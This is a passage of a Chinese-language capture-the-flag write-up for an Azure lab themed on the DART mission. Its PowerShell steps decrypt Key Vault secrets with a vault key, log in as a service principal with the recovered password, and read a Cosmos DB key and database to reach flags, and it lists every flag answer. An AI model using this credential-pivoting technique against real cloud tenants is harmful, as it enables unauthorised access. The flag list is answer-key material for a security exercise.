Name         : 0704d1bc-950f-42c8-b0cd-c0569d111da1
Version      :
Id           : https://cubesat.vault.azure.net:443/secrets/0704d1bc-950f-42c8-b0cd-c0569d111da1
Enabled      : True
Expires      :
Not Before   :
Created      : 2025/10/24 10:22:25
Updated      : 2025/10/24 10:22:25
Content Type :
Tags         :

Vault Name   : cubesat
Name         : Ascension
Version      :
Id           : https://cubesat.vault.azure.net:443/secrets/Ascension
Enabled      : True
Expires      :
Not Before   :
Created      : 2023/3/15 14:33:32
Updated      : 2023/3/15 14:33:32
Content Type :
Tags         :

Vault Name   : cubesat
Name         : Flag8
Version      :
Id           : https://cubesat.vault.azure.net:443/secrets/Flag8
Enabled      : True
Expires      :
Not Before   :
Created      : 2023/3/17 9:38:18
Updated      : 2023/3/17 9:38:18
Content Type :
Tags         :

Vault Name   : cubesat
Name         : Flag9
Version      :
Id           : https://cubesat.vault.azure.net:443/secrets/Flag9
Enabled      : True
Expires      :
Not Before   :
Created      : 2023/3/17 9:42:41
Updated      : 2023/3/17 9:42:41
Content Type :
Tags         :

PS C:\Users\Randark> Get-AzKeyVaultSecret -VaultName CubeSat -Name Flag8 -AsPlainText
Flag 8 : DART spacecraft has entered final descent.

PS C:\Users\Randark> Get-AzKeyVaultSecret -VaultName CubeSat -Name Flag9 -AsPlainText
Get-AzKeyVaultSecret: Operation returned an invalid status code 'Forbidden'
Code: Forbidden
Message: Caller is not authorized to perform action on resource.
If role assignments, deny assignments or role definitions were changed recently, please observe propagation time.
Caller: appid=6de8103e-049a-4f88-9abf-41099a79ca53;oid=8c48dec1-04d6-4326-badd-59f11bf4c701;iss=https://sts.windows.net/5f487283-b88e-4ade-8035-7bcaac4156b3/
Action: 'Microsoft.KeyVault/vaults/secrets/getSecret/action'
Resource: '/subscriptions/7b9bd916-8bd2-4446-9678-8531ef663edb/resourcegroups/dartmission/providers/microsoft.keyvault/vaults/cubesat/secrets/flag9'
Assignment: (not found)
DenyAssignmentId: null
DecisionReason: null
Vault: CubeSat;location=eastus
```

### Flag 9

看起来 Flag 9 没办法直接读取，但是可以换一个方式

```powershell
PS C:\Users\Randark> Get-AzKeyVaultSecret -VaultName CubeSat -Name 0704d1bc-950f-42c8-b0cd-c0569d111da1 -AsPlainText
a2fi9i7KB827533ZQ7lirT5UEHkVCKPnjvlm5rXBB5OZLiPiWveu7vZZUh2EirGmirB2NSpItp+bfIG9P3FywJtz/lstqxGH/x69f8BqjRAdp8RuI90jIfPB97DPDcT0CACYEXpcSKW8BvZF2yJDulvR7SxOoTuwlUdlUNiEdNcAAFIpASeh8gfwpr/gCq3ZWiJQbJwjHiYK8D1H1ZrA6MuhYD1y4GaRZ11DCZYc+VmWcVfcGHOS0ia3yY0WBMdpHRsm1a4xyG0SZ8qA69Tb3LA94LYGI1uYMExJU+MRXL/72eJ6Sf3ooMEBYRhFgBOT0rLnXrzRoTQGgmFFOX9UTg==

PS C:\Users\Randark> Get-AzKeyVaultKey -VaultName CubeSat

Vault/HSM Name : cubesat
Name           : LICIACube
Version        :
Id             : https://cubesat.vault.azure.net:443/keys/LICIACube
Enabled        : True
Expires        :
Not Before     :
Created        : 2023/3/15 14:33:41
Updated        : 2023/3/15 14:33:41
Recovery Level : Recoverable+Purgeable
Tags           :

PS C:\Users\Randark> Get-AzKeyVaultKey -VaultName CubeSat -Name LICIACube -IncludeVersions

Vault/HSM Name : cubesat
Name           : LICIACube
Version        : 9d0a48dff86d47559001a1387a9cd927
Id             : https://cubesat.vault.azure.net:443/keys/LICIACube/9d0a48dff86d47559001a1387a9cd927
Enabled        : True
Expires        :
Not Before     :
Created        : 2023/3/15 14:33:41
Updated        : 2023/3/15 14:33:41
Recovery Level : Recoverable+Purgeable
Tags           :

Vault/HSM Name : cubesat
Name           : LICIACube
Version        : 2482e07e3dda4792af854ce1e7eebc02
Id             : https://cubesat.vault.azure.net:443/keys/LICIACube/2482e07e3dda4792af854ce1e7eebc02
Enabled        : True
Expires        :
Not Before     :
Created        : 2023/3/15 14:33:12
Updated        : 2023/3/15 14:33:12
Recovery Level : Recoverable+Purgeable
Tags           :
```

尝试进行解密

```powershell
PS C:\Users\Randark> $EncString = Get-AzKeyVaultSecret -VaultName CubeSat -Name 0704d1bc-950f-42c8-b0cd-c0569d111da1 -AsPlainText
PS C:\Users\Randark> $encryptedBytes = [Convert]::FromBase64String($EncString)
PS C:\Users\Randark> $DecryptedData = Invoke-AzKeyVaultKeyOperation -Operation Decrypt -Algorithm RSA1_5 -VaultName CubeSat -Name LICIACube -Version 9d0a48dff86d47559001a1387a9cd927 -ByteArrayValue $encryptedBytes
PS C:\Users\Randark> [system.Text.Encoding]::UTF8.GetString($DecryptedData.RawResult)
jyR8******HjcUa
```

然后执行认证

```powershell
PS C:\Users\Randark> $password = ConvertTo-SecureString ‘jyR8******HjcUa’ -AsPlainText -Force
PS C:\Users\Randark> $cred = New-Object System.Management.Automation.PSCredential('0704d1bc-950f-42c8-b0cd-c0569d111da1', $password)
PS C:\Users\Randark> Connect-AzAccount -ServicePrincipal -Credential $cred -Tenant 5f487283-b88e-4ade-8035-7bcaac4156b3

Subscription name Tenant
----------------- ------
dartsub           5f487283-b88e-4ade-8035-7bcaac4156b3
```

重新尝试获取Azure资源

```powershell
PS C:\Users\Randark> Get-AzResource

Name              : outermainbelt
ResourceGroupName : DARTMission
ResourceType      : Microsoft.DocumentDB/databaseAccounts
Location          : eastus
ResourceId        : /subscriptions/7b9bd916-8bd2-4446-9678-8531ef663edb/resourceGroups/DARTMission/providers/Microsoft.DocumentDB/databaseAccounts/outermainbel
                    t
Tags              :

Name              : CubeSat
ResourceGroupName : DARTMission
ResourceType      : Microsoft.KeyVault/vaults
Location          : eastus
ResourceId        : /subscriptions/7b9bd916-8bd2-4446-9678-8531ef663edb/resourceGroups/DARTMission/providers/Microsoft.KeyVault/vaults/CubeSat
Tags              :

PS C:\Users\Randark> Get-AzKeyVaultSecret -VaultName cubesat -Name Flag9 -AsPlainText
Flag 9 : Prepare for impact!
```

### Final Flag

如法炮制

```powershell
PS C:\Users\Randark> Get-AzKeyVaultSecret -VaultName CubeSat -Name Ascension -AsPlainText
aJa+nuiOLWO0yQJk/2zxmYlCDR6y3POHUTuX84FF5Sx/EsHvvMmKMnN8zbLMCtXAodhAnpXHk6bG0zl744vwb9wk7/KwG18NJL/VqaX2/BP3iLkSg7X/uyGBqH+Ptsr0YoF5RBfRUE2QrWdfqGS5Q5n9YAI6mv2m93Zz8sLntRQe07R8NuGB8w5yHuVSREOiw/Lbagk4jk6QmUiH172HzYyC+Udh83JPHX2kiTo/usO/tHSuSRNAhnvqHeViANFONCK4TA9diWAgKmox2pn3P5SuiviIxtoIN+4V8cP1gW72KkG4/OhyqBYZbpxnP9stCensRnhWi3fb1AVOwEluJQ==
PS C:\Users\Randark> $EncString = Get-AzKeyVaultSecret -VaultName CubeSat -Name Ascension -AsPlainText
PS C:\Users\Randark> $encryptedBytes = [Convert]::FromBase64String($EncString)
PS C:\Users\Randark> $DecryptedData = Invoke-AzKeyVaultKeyOperation -Operation Decrypt -Algorithm RSA1_5 -VaultName CubeSat -Name LICIACube -Version 2482e07e3dda4792af854ce1e7eebc02 -ByteArrayValue $encryptedBytes
PS C:\Users\Randark> [system.Text.Encoding]::UTF8.GetString($DecryptedData.RawResult)
RxaUCkX******ACDbTyEgYg==
PS C:\Users\Randark> $primaryKey = ConvertTo-SecureString -String 'RxaUCkX******ACDbTyEgYg==' -AsPlainText -Force
PS C:\Users\Randark> $cosmosDbContext = New-CosmosDbContext -Key $primaryKey -Account 'outermainbelt'
PS C:\Users\Randark> $cosmosDbContext

Account       : outermainbelt
Database      :
Key           : System.Security.SecureString
KeyType       : master
BaseUri       : https://outermainbelt.documents.azure.com/
Token         :
EntraIdToken  :
BackoffPolicy :
Environment   : AzureCloud

PS C:\Users\Randark> Get-CosmosDbDatabase -Context $cosmosDbContext

Id      Etag                                 ResourceId Timestamp          Uri
--      ----                                 ---------- ---------          ---
didymos 00003200-0000-0100-0000-6411d5140000 MH9QAA==   2023/3/15 22:24:20 dbs/MH9QAA==/

PS C:\Users\Randark> $cosmosDbContext = New-CosmosDbContext -Key $primaryKey -Account 'outermainbelt' -Database 'didymos'
PS C:\Users\Randark> Get-CosmosDbCollection -Context $cosmosDbContext

Id       Etag                                 ResourceId   Timestamp         Uri
--       ----                                 ----------   ---------         ---
didymosb 0000ef02-0000-0100-0000-686024320000 MH9QAIF32zU= 2025/6/29 1:19:46 dbs/MH9QAA==/colls/MH9QAIF32zU=/
PS C:\Users\Randark> Get-CosmosDbDocument -Context $cosmosDbContext -CollectionId 'didymosb'

Id                                   Etag                                 ResourceId               Timestamp          Uri
--                                   ----                                 ----------               ---------          ---
aae805ee-7753-489a-b015-b4417453ffff 00005d9a-0000-0100-0000-641432d00000 MH9QAIF32zUBAAAAAAAAAA== 2023/3/17 17:28:48 dbs/MH9QAA==/colls/MH9QAIF32zU=/docs/MH9QAIF32zUBAAAAAAAAAA==/
PS C:\Users\Randark> Get-CosmosDbDocument -Context $cosmosDbContext -CollectionId 'didymosb' | fl *

id           : aae805ee-7753-489a-b015-b4417453ffff
Key          : Dimorphos
Value        : 523af7b1494b22561445ef528647af73
_rid         : MH9QAIF32zUBAAAAAAAAAA==
_self        : dbs/MH9QAA==/colls/MH9QAIF32zU=/docs/MH9QAIF32zUBAAAAAAAAAA==/
_etag        : "00005d9a-0000-0100-0000-641432d00000"
_attachments : attachments/
_ts          : 1679045328
Etag         : 00005d9a-0000-0100-0000-641432d00000
ResourceId   : MH9QAIF32zUBAAAAAAAAAA==
Timestamp    : 2023/3/17 17:28:48
Uri          : dbs/MH9QAA==/colls/MH9QAIF32zU=/docs/MH9QAIF32zUBAAAAAAAAAA==/
Attachments  : attachments/
```

:::note

如果遇到

```plaintext
New-CosmosDbContext: The term 'New-CosmosDbContext' is not recognized as a name of a cmdlet, function, script file, or executable program.
Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
```

请执行

```powershell
Install-Module -Name CosmosDB
```

:::

## Completion Certificate

:::info Flags

<details>

<summary> Flag 1 </summary>

```plaintext
Launch confirmed. DART is on right path.
```

</details>

<details>

<summary> Flag 2 </summary>

```plaintext
Telemetry check-in confirmed.
```

</details>

<details>

<summary> Flag 3 </summary>

```plaintext
Anomaly detected in spacecraft trajectory.
```

</details>

<details>

<summary> Flag 4 </summary>

```plaintext
Adjust spacecraft altitude by 5 degrees.
```

</details>

<details>

<summary> Flag 5 </summary>

```plaintext
Spacecraft velocity 23,760 km/h.
```

</details>

<details>

<summary> Flag 6 </summary>

```plaintext
Course correction burn deployed.
```

</details>

<details>

<summary> Flag 7 </summary>

```plaintext
All systems are functioning normally.
```

</details>

<details>

<summary> Flag 8 </summary>

```plaintext
DART spacecraft has entered final descent.
```

</details>

<details>

<summary> Flag 9 </summary>

```plaintext
Prepare for impact!
```

</details>

<details>

<summary> Final Flag </summary>

```plaintext
523af7b1494b22561445ef528647af73
```

</details>

:::

## After all

![Certificate](img/image_20260115-081514.png)
